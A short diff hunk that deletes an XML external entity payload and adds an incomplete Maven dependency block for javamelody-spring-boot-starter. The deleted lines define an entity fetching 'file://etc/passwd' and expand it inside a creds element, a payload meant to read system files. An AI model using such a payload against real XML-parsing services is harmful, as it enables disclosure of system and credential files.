@@ -1,4 +1,5 @@
-<?xml version="1.0" encoding="utf-8"?> 
-<!DOCTYPE creds [  
-<!ENTITY goodies SYSTEM "file://etc/passwd"> ]> 
-<creds>&goodies;</creds>
+<dependency>
+            <groupId>net.bull.javamelody</groupId>
+            <artifactId>javamelody-spring-boot-starter</artifactId>
+            <version>1.73.1</version>
+        </dependency
